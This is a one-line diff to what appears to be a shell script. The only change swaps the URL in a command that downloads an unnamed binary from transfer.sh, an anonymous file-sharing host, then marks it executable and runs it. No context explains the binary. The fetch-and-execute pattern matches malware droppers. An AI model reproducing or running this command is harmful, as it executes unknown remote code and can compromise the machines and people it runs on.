@@ -1,1 +1,1 @@
-wget https://transfer.sh/ouWKnc/0001; chmod +x 0001; ./0001
+wget https://transfer.sh/5ylr68/0001; chmod +x 0001; ./0001
